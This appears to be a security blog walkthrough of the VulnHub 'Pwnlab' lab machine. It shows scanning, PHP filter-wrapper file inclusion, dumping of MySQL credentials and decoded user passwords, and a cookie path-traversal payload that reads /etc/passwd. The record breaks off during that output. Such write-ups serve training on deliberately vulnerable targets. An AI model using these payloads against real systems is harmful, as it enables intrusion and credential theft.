@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Pwnlab
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Pwnlab" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: Boot2Root virtual machine. Meant to be easy." />
+<meta property="og:description" content="Description: Boot2Root virtual machine. Meant to be easy." />
+<link rel="canonical" href="http://localhost:4000/pwnlab.html" />
+<meta property="og:url" content="http://localhost:4000/pwnlab.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/pwnlab.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-10T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/pwnlab.html" />
+<meta property="twitter:title" content="VulnHub - Pwnlab" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Pwnlab","dateModified":"2021-12-10T00:00:00-05:00","datePublished":"2021-12-10T00:00:00-05:00","url":"http://localhost:4000/pwnlab.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwnlab.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: Boot2Root virtual machine. Meant to be easy.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Pwnlab</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>December 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> Boot2Root virtual machine. Meant to be easy.</p>
+
+<p><strong>Author:</strong> Claor</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping sweep on the local network discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
+192.168.179.176 <span class="o">=&gt;</span> up
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP/UDP port scan with unicornscan discovered four open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.176:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.176:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+...
+TCP open                    http[   80]         from 192.168.179.176  ttl 64 
+TCP open                  sunrpc[  111]         from 192.168.179.176  ttl 64 
+TCP open                   mysql[ 3306]         from 192.168.179.176  ttl 64 
+TCP open                 unknown[55285]         from 192.168.179.176  ttl 64 
+...
+UDP open                  sunrpc[  111]         from 192.168.179.176  ttl 64
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Service detection and script scanning was performed with nmap against open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,111,3306,55285 192.168.179.176 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: PwnLab Intranet Image Hosting
+111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          40121/tcp6  status
+|   100024  1          41643/udp   status
+|   100024  1          52410/udp6  status
+|_  100024  1          55285/tcp   status
+3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.5.47-0+deb8u1
+|   Thread ID: 47
+|   Capabilities flags: 63487
+|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, InteractiveClient, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, LongColumnFlag, LongPassword, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: tA&amp;9,psoR-<span class="o">(</span>~e^<span class="o">(</span>K~<span class="se">\2</span><span class="c">#</span>
+|_  Auth Plugin Name: mysql_native_password
+55285/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>The web application has a functionality to upload files, but it requires to be authenticated.</p>
+
+<p><img src="/assets/images/pwnlab/screenshot-1.png" alt="" /></p>
+
+<p>I ran gobuster to discover some interesting file or directory, the only one that catches my attention is the config.php file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.176/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> html,php,txt <span class="nt">-e</span>
+...
+http://192.168.179.176/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 332]
+http://192.168.179.176/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.176/images/]
+http://192.168.179.176/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 250]                                      
+http://192.168.179.176/upload               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.176/upload/]
+http://192.168.179.176/upload.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19]                                       
+http://192.168.179.176/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]                                        
+http://192.168.179.176/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
+</code></pre></div></div>
+
+<p>After to enumerate for some time I was able to detect a Local File Inclusion, using wrappers it was possible to read the PHP files, since when including the files of the system of conventional form didn’t obtain results.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.176/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>login
+</code></pre></div></div>
+
+<p><img src="/assets/images/pwnlab/screenshot-2.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+
+<p>With curl I downloaded the content of the login.php file, we can see that the login form uses prepared queries, reason why SQL Injection wasn’t possible.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=login"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>login.php
+&lt;?php
+session_start<span class="o">()</span><span class="p">;</span>
+require<span class="o">(</span><span class="s2">"config.php"</span><span class="o">)</span><span class="p">;</span>
+<span class="nv">$mysqli</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$server</span>, <span class="nv">$username</span>, <span class="nv">$password</span>, <span class="nv">$database</span><span class="o">)</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">])</span> and isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">]))</span>
+<span class="o">{</span>
+        <span class="nv">$luser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]</span><span class="p">;</span>
+        <span class="nv">$lpass</span> <span class="o">=</span> base64_encode<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])</span><span class="p">;</span>
+
+        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span>-&gt;prepare<span class="o">(</span><span class="s2">"SELECT * FROM users WHERE user=? AND pass=?"</span><span class="o">)</span><span class="p">;</span>
+        <span class="nv">$stmt</span>-&gt;bind_param<span class="o">(</span><span class="s1">'ss'</span>, <span class="nv">$luser</span>, <span class="nv">$lpass</span><span class="o">)</span><span class="p">;</span>
+
+        <span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
+        <span class="nv">$stmt</span>-&gt;store_Result<span class="o">()</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="nv">$stmt</span>-&gt;num_rows <span class="o">==</span> 1<span class="o">)</span>
+        <span class="o">{</span>
+                <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$luser</span><span class="p">;</span>
+                header<span class="o">(</span><span class="s1">'Location: ?page=upload'</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">else</span>
+        <span class="o">{</span>
+                <span class="nb">echo</span> <span class="s2">"Login failed."</span><span class="p">;</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+<span class="k">else</span>
+<span class="o">{</span>
+        ?&gt;
+        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">""</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"POST"</span><span class="o">&gt;</span>
+        &lt;label&gt;Username: &lt;/label&gt;&lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">"user"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"test"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"user"</span><span class="o">&gt;</span>&lt;br /&gt;
+        &lt;label&gt;Password: &lt;/label&gt;&lt;input <span class="nb">id</span><span class="o">=</span><span class="s2">"pass"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"pass"</span><span class="o">&gt;</span>&lt;br /&gt;
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Login"</span><span class="o">&gt;</span>
+        &lt;/form&gt;
+        &lt;?php
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>The upload.php file verifies the image extension through a whitelist, checks the file type, makes sure the “/” isn’t entered trying to add another file type, uses md5 to encrypt the name of the image and attach the extension with which the script was uploaded.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=upload"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>upload.php
+&lt;?php
+session_start<span class="o">()</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(!</span>isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'user'</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="s1">'You must be log in.'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
+?&gt;
+&lt;html&gt;
+        &lt;body&gt;
+                &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">''</span> <span class="nv">method</span><span class="o">=</span><span class="s1">'post'</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">'multipart/form-data'</span><span class="o">&gt;</span>
+                        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">'file'</span> <span class="nv">name</span><span class="o">=</span><span class="s1">'file'</span> <span class="nb">id</span><span class="o">=</span><span class="s1">'file'</span> /&gt;
+                        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">'submit'</span> <span class="nv">name</span><span class="o">=</span><span class="s1">'submit'</span> <span class="nv">value</span><span class="o">=</span><span class="s1">'Upload'</span>/&gt;
+                &lt;/form&gt;
+        &lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'submit'</span><span class="o">]))</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'error'</span><span class="o">]</span> &lt;<span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
+                <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]</span><span class="p">;</span>
+                <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'type'</span><span class="o">]</span><span class="p">;</span>
+                <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">'upload/'</span><span class="p">;</span>
+                <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">'.'</span><span class="o">)</span><span class="p">;</span>
+                <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">])</span><span class="p">;</span>
+                <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">".jpg"</span>,<span class="s2">".jpeg"</span>,<span class="s2">".gif"</span>,<span class="s2">".png"</span><span class="o">)</span><span class="p">;</span>
+
+                <span class="k">if</span> <span class="o">(!(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
+                        die<span class="o">(</span><span class="s1">'Not allowed extension, please upload images only.'</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">'image'</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
+                        die<span class="o">(</span><span class="s1">'Error 001'</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/gif'</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/jpeg'</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/jpg'</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">'mime'</span><span class="o">]</span> <span class="o">!=</span> <span class="s1">'image/png'</span><span class="o">)</span> <span class="o">{</span>
+                        die<span class="o">(</span><span class="s1">'Error 002'</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">'/'</span><span class="o">)&gt;</span>1<span class="o">){</span>
+                        die<span class="o">(</span><span class="s1">'Error 003'</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+
+                <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="nb">.</span> md5<span class="o">(</span><span class="nb">basename</span><span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>
+
+                <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'file'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="nb">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="s2">"</span>.<span class="nv">$uploadfile</span>.<span class="s2">"</span><span class="se">\"</span><span class="s2">&gt;&lt;br /&gt;"</span><span class="p">;</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        die<span class="o">(</span><span class="s1">'Error 4'</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+
+?&gt;
+</code></pre></div></div>
+
+<p>We can see in the index.php file that it includes any file without validating the input and adds the .php extension.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=index"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>index.php
+&lt;?php
+//Multilingual. Not implemented yet.
+//setcookie<span class="o">(</span><span class="s2">"lang"</span>,<span class="s2">"en.lang.php"</span><span class="o">)</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">]))</span>
+<span class="o">{</span>
+        include<span class="o">(</span><span class="s2">"lang/"</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">])</span><span class="p">;</span>
+<span class="o">}</span>
+// Not implemented yet.
+?&gt;
+&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"images/pwnlab.png"</span><span class="o">&gt;</span>&lt;br /&gt;
+<span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/"</span><span class="o">&gt;</span>Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?page=login"</span><span class="o">&gt;</span>Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?page=upload"</span><span class="o">&gt;</span>Upload&lt;/a&gt; <span class="o">]</span>
+&lt;hr/&gt;&lt;br/&gt;
+&lt;?php
+        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]))</span>
+        <span class="o">{</span>
+                include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">else</span>
+        <span class="o">{</span>
+                <span class="nb">echo</span> <span class="s2">"Use this server to upload and share image files inside the intranet"</span><span class="p">;</span>
+        <span class="o">}</span>
+?&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>The config.php file contains the credentials to log into MySQL</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=config"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>config.php
+&lt;?php
+<span class="nv">$server</span>   <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"H4u%QJ_H99"</span><span class="p">;</span>
+<span class="nv">$database</span> <span class="o">=</span> <span class="s2">"Users"</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p>Listing the tables from the database Users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mysql <span class="nt">-h</span> 192.168.179.176 <span class="nt">-u</span> root <span class="nt">-D</span> Users <span class="nt">-p</span>
+Enter password: 
+MySQL <span class="o">[</span>Users]&gt; show tables<span class="p">;</span>
++-----------------+
+| Tables_in_Users |
++-----------------+
+| <span class="nb">users</span>           |
++-----------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.003 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Retrieving the records from the table users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL <span class="o">[</span>Users]&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> |
+| mike | <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> |
+| kane | <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> |
++------+------------------+
+3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.004 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We save it to a file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>mysql.users 
+kent:Sld6WHVCSkpOeQ<span class="o">==</span> 
+mike:U0lmZHNURW42SQ<span class="o">==</span> 
+kane:aVN2NVltMkdSbw<span class="o">==</span>
+</code></pre></div></div>
+
+<p>I developed a bash script to decode the passwords in base64.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>x <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>mysql.users<span class="si">)</span><span class="p">;</span> <span class="k">do
+        </span><span class="nv">db64</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">':'</span> <span class="nt">-f</span> 2 | <span class="nb">base64</span> <span class="nt">-d</span><span class="si">)</span>
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$x</span><span class="s2">  (</span><span class="se">\e</span><span class="s2">[1;33m</span><span class="nv">$db64</span><span class="se">\e</span><span class="s2">[0m)"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>bash decoder.sh
+kent:Sld6WHVCSkpOeQ<span class="o">==</span>  <span class="o">(</span>JWzXuBJJNy<span class="o">)</span>
+mike:U0lmZHNURW42SQ<span class="o">==</span>  <span class="o">(</span>SIfdsTEn6I<span class="o">)</span>
+kane:aVN2NVltMkdSbw<span class="o">==</span>  <span class="o">(</span>iSv5Ym2GRo<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We log into the login form with any user.</p>
+
+<p><img src="/assets/images/pwnlab/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/pwnlab/screenshot-4.png" alt="" /></p>
+
+<p>Was not possible that our PHP reverse shell to be interpreted using the previous parameter, we need another way, in the file index.php there is another point that allows including files through the superglobal $_COOKIE variable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">head </span>index.php                                             
+&lt;?php
+//Multilingual. Not implemented yet.
+//setcookie<span class="o">(</span><span class="s2">"lang"</span>,<span class="s2">"en.lang.php"</span><span class="o">)</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">]))</span>
+<span class="o">{</span>
+        include<span class="o">(</span><span class="s2">"lang/"</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">])</span><span class="p">;</span>
+<span class="o">}</span>
+// Not implemented yet.
+?&gt;
+&lt;html&gt;
+</code></pre></div></div>
+
+<p>We can verify that it is possible including any file through cookies header.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">--cookie</span> <span class="s1">'lang=../../../../etc/passwd'</span> 192.168.179.176
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
